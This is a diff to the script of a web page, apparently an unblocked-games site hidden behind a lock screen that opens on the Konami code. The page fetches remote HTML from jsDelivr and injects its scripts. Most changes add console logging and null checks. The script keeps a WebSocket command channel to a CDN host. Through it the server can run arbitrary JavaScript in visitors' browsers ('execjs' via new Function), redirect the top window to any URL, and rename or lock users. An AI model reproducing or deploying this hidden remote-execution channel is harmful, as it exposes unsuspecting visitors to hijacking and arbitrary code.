@@ -120,14 +120,6 @@
 const WS_URL = 'wss://tpws.b-cdn.net';
 const KONAMI = ["ArrowUp","ArrowUp","ArrowDown","ArrowDown","ArrowLeft","ArrowRight","ArrowLeft","ArrowRight","b","a","Enter"];
 
-const EL = {
-  r: document.getElementById('r'),
-  lockscreen: document.getElementById('lockscreen'),
-  prompt: document.getElementById('username-prompt'),
-  input: document.getElementById('username-input'),
-  toast: document.getElementById('tp-toast')
-};
-
 let pos = 0;
 let ws = null;
 let wsReady = false;
@@ -135,14 +127,20 @@ let siteLoaded = false;
 let locked = localStorage.getItem('unlocked') !== '1';
 let currentGameId = null;
 
+console.log('[TP] init, locked:', locked);
+
 if (!localStorage.getItem('tp_temp_username')) {
   localStorage.setItem('tp_temp_username', 'user_' + Math.floor(Math.random() * 9000 + 1000));
 }
 const tempUsername = localStorage.getItem('tp_temp_username');
 let username = localStorage.getItem('tp_username') || tempUsername;
 
+console.log('[TP] username:', username);
+
 function showToast(msg, duration) {
-  const t = EL.toast;
+  console.log('[TP] showToast called:', msg);
+  const t = document.getElementById('tp-toast');
+  if (!t) { console.warn('[TP] showToast: #tp-toast not found'); return; }
   duration = duration || 6000;
   const fsEl = document.fullscreenElement || document.webkitFullscreenElement;
   const parent = fsEl || document.body;
@@ -154,9 +152,11 @@ function showToast(msg, duration) {
 }
 
 document.addEventListener('fullscreenchange', function() {
+  const t = document.getElementById('tp-toast');
+  if (!t) { console.warn('[TP] fullscreenchange: #tp-toast not found'); return; }
   const fsEl = document.fullscreenElement;
-  if (fsEl) fsEl.appendChild(EL.toast);
-  else document.body.appendChild(EL.toast);
+  if (fsEl) fsEl.appendChild(t);
+  else document.body.appendChild(t);
 });
 
 const _origAddEL = EventTarget.prototype.addEventListener;
@@ -172,12 +172,14 @@ function checkGameId() {
   const id = params.get('id') || null;
   if (id !== currentGameId) {
     currentGameId = id;
+    console.log('[TP] gameId changed:', currentGameId);
     sendGameUpdate();
   }
 }
 
 function sendGameUpdate() {
   if (wsReady && username) {
+    console.log('[TP] sendGameUpdate:', currentGameId);
     ws.send(JSON.stringify({ type: 'game_update', gameId: currentGameId }));
   }
 }
@@ -190,12 +192,14 @@ history.pushState = function() {
 window.addEventListener('popstate', checkGameId);
 
 function saveUsername() {
-  const val = EL.input.value.trim();
+  const val = document.getElementById('username-input').value.trim();
   if (!val) return;
   const oldName = username;
   username = val;
+  console.log('[TP] saveUsername:', username);
   localStorage.setItem('tp_username', username);
-  EL.prompt.classList.remove('show');
+  const prompt = document.getElementById('username-prompt');
+  if (prompt) prompt.classList.remove('show');
   if (wsReady) {
     ws.send(JSON.stringify({ type: 'self_rename', oldName: oldName, newName: username }));
     ws.send(JSON.stringify({ type: 'identify', username: username }));
@@ -207,11 +211,23 @@ function saveUsername() {
 function loadSite() {
   if (siteLoaded) return;
   siteLoaded = true;
-  EL.lockscreen.style.display = 'none';
+  console.log('[TP] loadSite: starting fetch');
+
+  const lockscreen = document.getElementById('lockscreen');
+  const prompt = document.getElementById('username-prompt');
+  const toast = document.getElementById('tp-toast');
+
+  if (lockscreen) lockscreen.style.display = 'none';
+  else console.warn('[TP] loadSite: #lockscreen not found');
+
   fetch("https://cdn.jsdelivr.net/gh/CatHead132/CatHead132.github.io@latest/gnupdated.html?t=" + Date.now())
-    .then(function(r) { return r.text(); })
+    .then(function(r) {
+      console.log('[TP] fetch response status:', r.status);
+      return r.text();
+    })
     .then(function(h) {
-      const d = EL.r;
+      console.log('[TP] fetch success, html length:', h.length);
+      const d = document.getElementById("r");
       const x = document.createElement("html");
       d.innerHTML = h;
       x.innerHTML = h;
@@ -223,34 +239,50 @@ function loadSite() {
         f.rel = "icon";
         f.href = i.getAttribute("href");
         document.head.appendChild(f);
+        console.log('[TP] icon set:', f.href);
       }
-      d.querySelectorAll("script").forEach(function(s) {
+
+      if (lockscreen) document.body.appendChild(lockscreen);
+      if (prompt) document.body.appendChild(prompt);
+      if (toast) document.body.appendChild(toast);
+      console.log('[TP] re-appended UI elements');
+
+      const scripts = d.querySelectorAll("script");
+      console.log('[TP] injecting scripts, count:', scripts.length);
+      scripts.forEach(function(s, idx) {
         const n = document.createElement("script");
         if (s.src) {
           n.src = s.src;
+          console.log('[TP] script', idx, 'src:', s.src);
         } else {
-          n.textContent = s.textContent;
+          const blob = new Blob([s.textContent], { type: 'text/javascript' });
+          n.src = URL.createObjectURL(blob);
+          console.log('[TP] script', idx, 'blob, len:', s.textContent.length);
         }
         if (s.type) n.type = s.type;
         document.body.appendChild(n);
       });
-    }).catch(function(){
+    }).catch(function(err) {
+      console.error('[TP] fetch failed:', err);
       siteLoaded = false;
     });
 }
 
 function connectWS() {
-  try { ws = new WebSocket(WS_URL); } catch(e) { scheduleReconnect(); return; }
+  console.log('[TP] connectWS');
+  try { ws = new WebSocket(WS_URL); } catch(e) { console.error('[TP] WS init error:', e); scheduleReconnect(); return; }
 
   ws.onopen = function() {
     wsReady = true;
+    console.log('[TP] WS open');
     ws.send(JSON.stringify({ type: 'identify', username: username }));
     sendGameUpdate();
   };
 
   ws.onmessage = function(e) {
     let msg;
-    try { msg = JSON.parse(e.data); } catch(err) { return; }
+    try { msg = JSON.parse(e.data); } catch(err) { console.warn('[TP] WS bad json:', e.data); return; }
+    console.log('[TP] WS message:', msg.type, msg);
 
     if (document.fullscreenElement || document.webkitFullscreenElement) {
       (document.exitFullscreen || document.webkitExitFullscreen || function(){}).call(document);
@@ -259,6 +291,7 @@ function connectWS() {
     if (msg.type === 'rename') {
       username = msg.newName;
       localStorage.setItem('tp_username', username);
+      console.log('[TP] renamed to:', username);
     }
 
     if (msg.type === 'notify') {
@@ -267,33 +300,42 @@ function connectWS() {
 
     if (msg.type === 'redirect') {
       const url = /^https?:\/\//i.test(msg.url) ? msg.url : 'https://' + msg.url;
+      console.log('[TP] redirect to:', url);
       window.top.location.href = url;
     }
 
     if (msg.type === 'execjs') {
-      try { (new Function(msg.code))(); } catch(err) {}
+      console.log('[TP] execjs received');
+      try { (new Function(msg.code))(); } catch(err) { console.error('[TP] execjs error:', err); }
     }
 
     if (msg.type === 'lock') {
+      console.log('[TP] lock received');
       locked = true;
       localStorage.removeItem('unlocked');
       siteLoaded = false;
-      EL.r.innerHTML = '';
-      EL.lockscreen.style.display = 'flex';
+      const r = document.getElementById('r');
+      const lockscreen = document.getElementById('lockscreen');
+      if (r) r.innerHTML = '';
+      else console.warn('[TP] lock: #r not found');
+      if (lockscreen) lockscreen.style.display = 'flex';
+      else console.warn('[TP] lock: #lockscreen not found');
     }
 
     if (msg.type === 'unlock') {
+      console.log('[TP] unlock received');
       locked = false;
       localStorage.setItem('unlocked', '1');
       location.reload();
     }
   };
 
-  ws.onclose = function() { wsReady = false; scheduleReconnect(); };
-  ws.onerror  = function() { wsReady = false; };
+  ws.onclose = function(e) { console.warn('[TP] WS closed, code:', e.code); wsReady = false; scheduleReconnect(); };
+  ws.onerror  = function(e) { console.error('[TP] WS error:', e); wsReady = false; };
 }
 
 function scheduleReconnect() {
+  console.log('[TP] reconnecting in 5s');
   setTimeout(connectWS, 5000);
 }
 
@@ -301,13 +343,17 @@ document.addEventListener('keydown', function(e) {
   if (e.key === KONAMI[pos]) {
     pos++;
     if (pos === KONAMI.length) {
+      console.log('[TP] konami unlocked');
       locked = false;
       localStorage.setItem('unlocked', '1');
       pos = 0;
+      const lockscreen = document.getElementById('lockscreen');
+      const prompt = document.getElementById('username-prompt');
+      const input = document.getElementById('username-input');
       if (!localStorage.getItem('tp_username')) {
-        EL.lockscreen.style.display = 'none';
-        EL.prompt.classList.add('show');
-        EL.input.focus();
+        if (lockscreen) lockscreen.style.display = 'none';
+        if (prompt) prompt.classList.add('show');
+        if (input) input.focus();
       } else {
         location.reload();
       }
@@ -319,19 +365,30 @@ document.addEventListener('keydown', function(e) {
 
 connectWS();
 
+const lockscreenEl = document.getElementById('lockscreen');
+const promptEl = document.getElementById('username-prompt');
+const inputEl = document.getElementById('username-input');
+
+console.log('[TP] elements found - lockscreen:', !!lockscreenEl, 'prompt:', !!promptEl, 'input:', !!inputEl);
+
 if (locked) {
-  EL.lockscreen.style.display = 'flex';
+  if (lockscreenEl) lockscreenEl.style.display = 'flex';
+  else console.warn('[TP] startup: #lockscreen not found');
 } else {
   if (!localStorage.getItem('tp_username')) {
-    EL.prompt.classList.add('show');
-    EL.input.focus();
+    if (promptEl) promptEl.classList.add('show');
+    if (inputEl) inputEl.focus();
   } else {
     loadSite();
   }
 }
 
-EL.input.addEventListener('keydown', function(e) {
-  if (e.key === 'Enter') saveUsername();
-});
+if (inputEl) {
+  inputEl.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') saveUsername();
+  });
+} else {
+  console.warn('[TP] startup: #username-input not found');
+}
 </script>
 </body></html>
